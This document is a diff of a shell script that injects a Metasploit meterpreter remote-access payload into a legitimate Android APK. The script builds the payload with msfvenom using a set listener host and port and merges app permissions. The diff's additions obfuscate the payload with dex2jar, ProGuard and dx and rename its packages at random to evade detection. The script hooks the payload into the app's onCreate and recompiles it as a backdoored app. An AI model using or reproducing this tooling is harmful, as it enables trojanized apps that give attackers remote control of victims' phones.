@@ -18,11 +18,14 @@
 MSFVENOM=msfvenom
 LHOST="10.6.9.31"
 LPORT="1337"
-APKTOOL=apktool2
+DEX2JAR=d2j-dex2jar
+APKTOOL=third-party/apktool/apktool
+PROGUARD=third-party/proguard5.2.1/lib/proguard
+DX=third-party/android-sdk-linux/build-tools/23.0.3/dx
 MY_PATH=`pwd`
 ORIG_APK_FILE=$1
 RAT_APK_FILE=Rat.apk
-LOG_FILE=run.log
+LOG_FILE=$MY_PATH/run.log
 
 if [ -z $ORIG_APK_FILE ]; then
   echo "[!] No original APK file specified";
@@ -44,15 +47,6 @@ if [ $rc != 0 ] || [ ! -f $RAT_APK_FILE ]; then
 fi
 echo "[+] Handle the meterpreter connection at: $LHOST:$LPORT"
 
-echo -n "[*] Decompiling original APK file...";
-$APKTOOL d -f -o $MY_PATH/original $MY_PATH/$ORIG_APK_FILE >>$LOG_FILE 2>&1
-rc=$?
-echo "done.";
-if [ $rc != 0 ]; then
-  echo "[!] Failed to decompile original APK file";
-  exit $rc;
-fi
-
 echo -n "[*] Decompiling RAT APK file...";
 $APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
 rc=$?
@@ -62,12 +56,99 @@ if [ $rc != 0 ]; then
   exit $rc;
 fi
 
+echo -n "[*] Decompiling original APK file...";
+$APKTOOL d -f -o $MY_PATH/original $MY_PATH/$ORIG_APK_FILE >>$LOG_FILE 2>&1
+rc=$?
+echo "done.";
+if [ $rc != 0 ]; then
+  echo "[!] Failed to decompile original APK file";
+  exit $rc;
+fi
+
+echo -n "[*] Merging permissions of original and payload projects...";
+# build random hex placeholder value without openssl
+placeholder=''
+for i in `seq 1 4`; do
+  rand_num=`shuf -i 1-9223372036854775807 -n 1`;
+  hex=`printf '%x' $rand_num`;
+  placeholder="$placeholder$hex";
+done
+echo "placeholder value: $placeholder" >>$LOG_FILE 2>&1
+tmp_perms_file=$MY_PATH/perms.tmp
+original_manifest_file=$MY_PATH/original/AndroidManifest.xml
+payload_manifest_file=$MY_PATH/payload/AndroidManifest.xml
+merged_manifest_file=$MY_PATH/original/AndroidManifest.xml.merged
+grep "<uses-permission" $original_manifest_file > $tmp_perms_file
+grep "<uses-permission" $payload_manifest_file >> $tmp_perms_file
+grep "<uses-permission" $tmp_perms_file|sort|uniq > $tmp_perms_file.uniq
+mv $tmp_perms_file.uniq $tmp_perms_file
+sed "s/<uses-permission.*\/>/$placeholder/g" $original_manifest_file > $merged_manifest_file
+cat $merged_manifest_file|uniq > $merged_manifest_file.uniq
+mv $merged_manifest_file.uniq $merged_manifest_file
+sed -i "s/$placeholder/$(sed -e 's/[\&/]/\\&/g' -e 's/$/\\n/' $tmp_perms_file | tr -d '\n')/" $merged_manifest_file
+diff $original_manifest_file $merged_manifest_file >>$LOG_FILE 2>&1
+mv $merged_manifest_file $original_manifest_file
+echo "done."
+
+# cleanup payload directory after merging app permissions
+rm -rf $MY_PATH/payload >> $LOG_FILE 2>&1
+
+# use dex2jar, proguard, and dx
+# to shrink, optimize, and obfuscate original Rat.apk code
+echo -n "[*] Running proguard on RAT APK file...";
+mkdir -v -p $MY_PATH/bin/classes >>$LOG_FILE 2>&1
+mkdir -v -p $MY_PATH/libs >> $LOG_FILE 2>&1
+mv $MY_PATH/$RAT_APK_FILE $MY_PATH/bin/classes >>$LOG_FILE 2>&1
+$DEX2JAR $MY_PATH/bin/classes/$RAT_APK_FILE -v -o $MY_PATH/bin/classes/Rat-dex2jar.jar >>$LOG_FILE 2>&1
+rc=$?
+if [ $rc != 0 ]; then
+  echo "done.";
+  echo "[!] Failed to run dex2jar on RAT APK file";
+  exit $rc;
+fi
+cd $MY_PATH/bin/classes && jar xvf Rat-dex2jar.jar >>$LOG_FILE 2>&1
+cd $MY_PATH
+rm $MY_PATH/bin/classes/*.apk $MY_PATH/bin/classes/*.jar >>$LOG_FILE 2>&1
+$PROGUARD @android.pro >>$LOG_FILE 2>&1
+rc=$?
+if [ $rc != 0 ]; then
+  echo "done.";
+  echo "[!] Failed to run proguard with specified configuration";
+  exit $rc;
+fi
+$DX --dex --output="$MY_PATH/$RAT_APK_FILE" $MY_PATH/bin/classes-processed.jar >>$LOG_FILE 2>&1
+rc=$?
+if [ $rc != 0 ]; then
+  echo "done.";
+  echo "[!] Failed to run dx on proguard processed jar file";
+  exit $rc;
+fi
+echo "done."
+
+echo -n "[*] Decompiling obfuscated RAT APK file...";
+$APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
+rc=$?
+echo "done.";
+if [ $rc != 0 ]; then
+  echo "[!] Failed to decompile RAT APK file";
+  exit $rc;
+fi
+
 # avoid having com/metasploit/stage path to smali files
-payload_primary_dir=`openssl rand -hex 16`
-payload_sub_dir=`openssl rand -hex 8`
+tldlist_max_line=`wc -l $MY_PATH/lists/tldlist.txt |awk '{ print $1 }'`
+tldlist_rand_line=`shuf -i 1-${tldlist_max_line} -n 1`
+namelist_max_line=`wc -l $MY_PATH/lists/namelist.txt |awk '{ print $1 }'`
+namelist_rand_line=`shuf -i 1-${namelist_max_line} -n 1`
+payload_tld=`sed "${tldlist_rand_line}q;d" $MY_PATH/lists/tldlist.txt`
+echo "payload_tld is: $payload_tld" >> $LOG_FILE 2>&1
+payload_primary_dir=`sed "${namelist_rand_line}q;d" $MY_PATH/lists/namelist.txt`
+echo "payload_primary_dir is: $payload_primary_dir" >> $LOG_FILE 2>&1
+namelist_rand_line=`shuf -i 1-${namelist_max_line} -n 1`
+payload_sub_dir=`sed "${namelist_rand_line}q;d" $MY_PATH/lists/namelist.txt`
+echo "payload_sub_dir is: $payload_sub_dir" >> $LOG_FILE 2>&1
 
 echo -n "[*] Creating new directories in original project for RAT smali files...";
-mkdir -v -p $MY_PATH/original/smali/net/$payload_primary_dir/$payload_sub_dir >>$LOG_FILE 2>&1
+mkdir -v -p $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir >>$LOG_FILE 2>&1
 rc=$?
 echo "done.";
 if [ $rc != 0 ]; then
@@ -76,7 +157,7 @@ if [ $rc != 0 ]; then
 fi
 
 echo -n "[*] Copying RAT smali files to new directories in original project...";
-cp -v $MY_PATH/payload/smali/com/metasploit/stage/Payload*.smali $MY_PATH/original/smali/net/$payload_primary_dir/$payload_sub_dir/ >>$LOG_FILE 2>&1
+cp -v $MY_PATH/payload/smali/net/dirtybox/util/{a.smali,b.smali,c.smali} $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/ >>$LOG_FILE 2>&1
 rc=$?
 echo "done.";
 if [ $rc != 0 ]; then
@@ -85,7 +166,7 @@ if [ $rc != 0 ]; then
 fi
 
 echo -n "[*] Fixing RAT smali files...";
-sed -i 's|com\([./]\)metasploit\([./]\)stage|net\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/original/smali/net/$payload_primary_dir/$payload_sub_dir/Payload*.smali >>$LOG_FILE 2>&1
+sed -i 's|net\([./]\)dirtybox\([./]\)util|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali} >>$LOG_FILE 2>&1
 rc=$?
 echo "done."
 if [ $rc != 0 ]; then
@@ -113,32 +194,14 @@ if [ ! -f $smali_file_to_hook ]; then
 fi
 
 echo -n "[*] Adding hook in original smali file...";
-sed -i '/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a \\n\ \ \ \ invoke-static \{p0\}, Lnet\/'"$payload_primary_dir"'\/'"$payload_sub_dir"'\/Payload;->start(Landroid\/content\/Context;)V' $smali_file_to_hook >>$LOG_FILE 2>&1
-grep -B 2 "net/$payload_primary_dir/$payload_sub_dir/Payload" $smali_file_to_hook >>$LOG_FILE 2>&1
+sed -i '/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a \\n\ \ \ \ invoke-static \{p0\}, L'"$payload_tld"'\/'"$payload_primary_dir"'\/'"$payload_sub_dir"'\/a;->a(Landroid\/content\/Context;)V' $smali_file_to_hook >>$LOG_FILE 2>&1
+grep -B 2 "$payload_tld/$payload_primary_dir/$payload_sub_dir/a" $smali_file_to_hook >>$LOG_FILE 2>&1
 rc=$?
 echo "done.";
 if [ $rc != 0 ]; then
   echo "[!] Failed to add hook";
   exit $rc;
 fi
-
-echo -n "[*] Merging permissions of original and payload projects...";
-placeholder=`openssl rand -hex 16`
-tmp_perms_file=$MY_PATH/perms.tmp
-original_manifest_file=$MY_PATH/original/AndroidManifest.xml
-payload_manifest_file=$MY_PATH/payload/AndroidManifest.xml
-merged_manifest_file=$MY_PATH/original/AndroidManifest.xml.merged
-grep "<uses-permission" $original_manifest_file > $tmp_perms_file
-grep "<uses-permission" $payload_manifest_file >> $tmp_perms_file
-grep "<uses-permission" $tmp_perms_file|sort|uniq > $tmp_perms_file.uniq
-mv $tmp_perms_file.uniq $tmp_perms_file
-sed "s/<uses-permission.*\/>/$placeholder/g" $original_manifest_file > $merged_manifest_file
-cat $merged_manifest_file|uniq > $merged_manifest_file.uniq
-mv $merged_manifest_file.uniq $merged_manifest_file
-sed -i "s/$placeholder/$(sed -e 's/[\&/]/\\&/g' -e 's/$/\\n/' $tmp_perms_file | tr -d '\n')/" $merged_manifest_file
-diff $original_manifest_file $merged_manifest_file >>$LOG_FILE 2>&1
-mv $merged_manifest_file $original_manifest_file
-echo "done."
 
 echo -n "[*] Recompiling original project with backdoor...";
 $APKTOOL b $MY_PATH/original >>$LOG_FILE 2>&1
